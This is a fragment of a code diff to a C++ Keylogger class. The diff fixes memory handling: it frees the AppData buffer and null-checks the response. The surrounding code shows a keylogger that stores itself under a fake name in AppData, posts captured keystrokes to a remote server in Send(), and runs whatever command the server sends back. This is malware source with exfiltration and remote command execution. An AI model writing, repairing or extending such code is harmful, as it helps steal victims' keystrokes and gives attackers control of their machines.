@@ -68,6 +68,8 @@ Keylogger::Keylogger()
 	registryPath[0] = '\0';
 	_tcscat_s(registryPath, appData);
 	_tcscat_s(registryPath, _T("\\" V_FAKE_NAME2));
+
+	free(appData);
 }
 Keylogger::~Keylogger()
 {
@@ -218,8 +220,12 @@ void Keylogger::Send()
 		msgText += *itr;
 	}
 
-	std::string response = network.SendPost(msgText.c_str(), msgText.size(), true);
-	cmd.Run(response);
+	char* response = network.SendPost(msgText.c_str(), msgText.size(), true);
+	if (response != nullptr)
+	{
+		cmd.Run(response);
+		free(response);
+	}
 
 	return;
 }
